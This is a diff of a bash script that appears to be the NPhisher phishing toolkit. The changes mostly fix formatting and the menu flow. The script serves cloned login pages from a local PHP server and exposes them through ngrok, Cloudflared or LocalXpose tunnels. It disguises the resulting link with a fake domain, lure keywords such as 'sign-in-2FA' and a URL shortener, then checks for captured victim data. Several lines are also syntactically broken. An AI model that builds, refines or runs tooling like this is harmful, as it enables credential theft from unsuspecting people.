@@ -28,6 +28,8 @@ server_dir="${pro_dir}/.server" #server directory
 sites_dir="${pro_dir}/.sites" #sites directory
 log_name=$(date +%d-%m-%Y-%H-%M-%S)
 
+#Variables
+LINK="INVALID"
 #Normal Banner
 banner(){
 	echo " "
@@ -130,6 +132,7 @@ dependencies() {
 reset_color() {
         tput sgr0   # reset attributes
         tput op     # reset color
+
     return
 }
 
@@ -259,12 +262,11 @@ shortcut() {
 shortcut_setup() {
 	rm -rf /bin/nphisher
 	shortcutcmd = "pro_dir = ${pro_dir}"
-	"if [[ -d "${pro_dir}" ]]; then
+	if [[ -d '${pro_dir}' ]]; then
 		bash ${pro_dir}/nphisher.sh
 	else
 		echo -e "\n [-] NPhisher directory not found. It maybe moved or deleted try downloading NPhisher again. "
 	fi
-	"
 	echo ${shortcutcmd} >> nphisher
 	chmod 777 nphisher
 	mv nphisher /bin
@@ -283,13 +285,17 @@ MASKING() { #4 last one using url shortner apis
 			grep -o 'https:[^"]*' site.log >> bURI;rm log.URI;sed 's/\\//g' bURI >> .uri.log;rm bURI
 			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
 		fi
+	else
+		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Erroe occured while masking try again"
+		sleep 5
+		cusurl
 	fi
-	{ clear; banner_small; }
+	{ clear; sbanner; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${ORANGE} MASKED URL : ${GREEN}${CUS_URL}-${Keystks}@${MASK_SUFfix}${GREEN}"
 }
 
-CHECK() { #3 checking for HTTP|S or WWW input type is valid or not.
+checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
 	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
 		if [[  "${1::3}" != 'www' ]]; then
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
@@ -298,41 +304,46 @@ CHECK() { #3 checking for HTTP|S or WWW input type is valid or not.
 	fi
 }
 
-cusurl(){ #1
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} ${LINK} ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " CUS_URI
-	if [[ "${CUS_URI}" =~ ^([Yy])$ ]]; then
-		printf " "
-		read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Enter Your Custom uRL ${BLUE}: https://google.com | www.google.com ~> " CUS_URL
-		CHECK ${CUS_URL}
-		printf " "
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
-		if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
-			MASKING
-		else
-			echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
-			{ sleep 1.5; clear; banner; cusurl; }
-		fi
-	elif [[ "${CUS_URI}" =~ ^([Nn])$ ]]; then
-		{ clear; banner_small; }
-		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
-		{ clear; banner; cusurl; }
-	fi
+cusurl(){
+	echo " "
+	echo -ne "${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?"
+	echo " "
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n):${ORANGE}" CUS_URI
+	case $CUS_URI in
+                Y | y)
+			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
+                	checkurl ${CUS_URL}
+        	        echo " "
+	                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+                	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
+	                        MASKING
+        	        else
+                        	echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
+                	        { sleep 1.5; clear; banner; cusurl; }
+        	        fi;;
+                N | n | *)
+                        { clear; sbanner; }
+	                echo " "
+                	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
+        	        echo " ";;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
+	                { clear; banner; cusurl; }
+                esac
 }
 
 ## Install ngrok
 check_ngrok(){
 	if [ ! -e ".server/ngrok" ]; then
+		echo " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
 		case $REPLY in
-												Y | y)
-												install_ngrok
-												ngrok_token_check;;
+		Y | y)
+			install_ngrok
+			ngrok_token_check;;
 
-												N | n | *)
-																tunnelmenu;;
+		N | n | *)
+			tunnelmenu;;
 
 		esac
 	else
@@ -356,7 +367,7 @@ install_ngrok() {
 ngrok_token_check(){
         if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
-								start_ngrok
+		start_ngrok
         else
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
                 ngrok_token_setup
@@ -368,11 +379,11 @@ ngrok_token_setup(){
         else
                mkdir $HOME/.ngrok2
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Created Ngrok2 directory "
+		echo " "
         fi
 
         if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
                rm -rf ${HOME}/.ngrok2/ngrok.yml
-	       echo -e "\n"
                read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
                authline="authtoken : ${ntoken}"
                echo "$authline" >> ngrok.yml
@@ -389,33 +400,34 @@ start_ngrok() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
         { sleep 1; setup_site; }
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-        ngrok_token_check
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && termux-chroot .server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && .server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
         { sleep 8; clear; banner; }
-        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-				LINK="${ngrok_url}"
-				cusurl
+##        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+	LINK="${ngrok_url}"
+	cusurl
         capture_data_check
 }
 
 ## Install Cloudflared
 check_cloudflared(){
 	if [ ! -e ".server/cloudflared" ]; then
+		echo " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
 		case $REPLY in
-												Y | y)
-																install_cloudflared
-																start_cloudflared;;
-
-												N | n | *)
-																tunnelmenu;;
-
+		Y | y)
+			install_cloudflared
+			start_cloudflared;;
+		N | n | *)
+			tunnelmenu;;
 		esac
+	else
+                start_cloudflared
 	fi
 }
 install_cloudflared() {
@@ -446,26 +458,29 @@ start_cloudflared() {
 
         { sleep 8; clear; banner; }
 
-        cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-				LINK="${cldflr_link}"
-				cusurl
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	LINK="${cldflr_link}"
+	cusurl
         capture_data_check
 }
 
 ## Install LocalXpose
 check_localxpose(){
 	if [ ! -e ".server/loclx" ]; then
+		echo " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
 		case $REPLY in
-												Y | y)
-																install_localxpose
-																token_localxpose
-																start_loclx;;
+		Y | y)
+			install_localxpose
+			token_localxpose
+			start_loclx;;
 
-												N | n | *)
-																tunnelmenu;;
+		N | n | *)
+			tunnelmenu;;
 
 		esac
+	else
+		start_loclx
 	fi
 }
 install_localxpose() {
@@ -513,7 +528,7 @@ start_loclx() {
 	fi
 
 	{ sleep 12; clear; banner; }
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
 	LINK="${loclx_url}"
 	cusurl
 	capture_data_check
@@ -557,28 +572,28 @@ start_localhost() {
         capture_data_check
 }
 
-#Hoast and port setup
+#Host and port setup
 HOST='127.0.0.1'
-PORT='4444'
 cusport() {
-	echo "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}$PORT"
 	echo " "
-	read -p "${RED}[${WHITE}?${RED}]${GREEN}Do you want to setup Custom port (Y/n) : ${BLUE}"
+	echo "${RED}[${WHITE}-${RED}]${GREEN}Your current port : ${BLUE}4444"
+	read -p "${RED}[${WHITE}?${RED}]${GREEN}Do you want to setup Custom port (Y/n) : ${BLUE}" 
 	case $REPLY in
-											Y | y)
-															read -p "${RED}[${WHITE}?${RED}]${GREEN}Type your Custom port : ${BLUE}" $cport
-															PORT=$cport;;
+	Y | y)
+		read -p "${RED}[${WHITE}?${RED}]${GREEN}Type your Custom port : ${BLUE}" cport
+		PORT="${cport}";;
 
-											N | n | *)
-															PORT=4444;;
-
+	N | n )
+		PORT="4444";;
+	*)
+		PORT="4444";;
 	esac
 }
 ## Setup website and start php server
 setup_site() {
         echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
         cp -rf .sites/"$website"/* .server/www
-				cusport
+	cusport
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
         cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
@@ -790,9 +805,9 @@ netstats="Offline"
 check_netstats() {
 			wget -q --spider http://api.github.com
 			if [ $? -eq 0 ]; then
-						netstats="Online"
+				netstats="Online"
 			else
-						netstats="Offline"
+				netstats="Offline"
 			fi
 }
 #Logs check
@@ -880,7 +895,7 @@ banner
 echo -e " "
 echo -e " "
 check_netstats
-echo "${GREEN}Network Status ${NC}= ${RED}$netstats"
+echo "${GREEN}Network Status = ${RED}$netstats"
 echo -e " "
 echo -e "${RED} CHOOSE A SITE : ${NC}"
 echo -e " "
@@ -2151,6 +2166,5 @@ directories
 kill_pid
 dependencies
 xpermission
-shortcut_setup
 clear
 mainmenu
